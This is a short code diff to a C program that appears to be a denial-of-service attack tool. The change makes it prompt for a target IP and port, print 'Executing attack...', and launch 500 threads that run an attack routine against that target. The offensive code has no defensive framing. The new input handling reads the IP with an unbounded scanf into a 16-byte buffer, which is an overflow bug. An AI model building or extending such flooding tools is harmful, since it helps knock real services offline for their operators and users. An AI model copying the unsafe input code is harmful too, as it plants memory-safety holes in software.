@@ -20,9 +20,15 @@ struct address{
 
 int main(){
     struct address target_addr;
-    target_addr.ip = "";
-    target_addr.port = 80;
+    char input_ip[16];
+    int input_port;
+    printf("Enter target IP: ");
+    scanf("%s", input_ip);
+    printf("Enter target port: ");
+    scanf("%i", &input_port);
     printf("Executing attack...\n");
+    target_addr.ip = input_ip;
+    target_addr.port = input_port;
     for (int i=0; i<500; i++){
         HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
         // printf("Thread created");
